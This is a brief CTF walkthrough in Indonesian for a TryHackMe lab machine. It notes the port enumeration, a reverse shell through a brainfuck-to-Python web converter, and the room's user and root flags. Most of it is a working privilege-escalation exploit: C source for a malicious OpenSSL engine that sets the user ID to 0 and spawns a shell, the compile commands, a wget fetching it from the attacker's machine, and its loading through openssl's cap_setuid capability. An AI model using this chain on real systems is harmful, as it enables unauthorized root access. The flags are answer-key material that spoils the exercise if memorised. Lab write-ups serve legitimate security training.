```
Enum, dapet port SSH dan port 80
```

```
Test port http, ada web buat convert brainfuck dan bakal dirun lewat python
```
```
Bikin revshell + encode
```
```
cat user.txt
thm{411f7d38247ff441ce4e134b459b6268}
```

```
/usr/bin/openssl = cap_setuid+ep

#include <unistd.h>

__attribute__((constructor))
static void init() {
	setuid(0);
	execl("/bin/sh", "sh", NULL);
}

gcc -fPIC -o a.o -c hehe.c && gcc -shared -o hehe.so -lcrypto a.o
```

```
mindgames@mindgames:/tmp$ wget 10.8.15.76:8000/Wuvel/CTF/TryHackMe/Mindgames/hehe.so

mindgames@mindgames:/tmp$ openssl req -engine ./hehe.so

whoami
root

cat /root/root.txt
thm{1974a617cc84c5b51411c283544ee254}
```
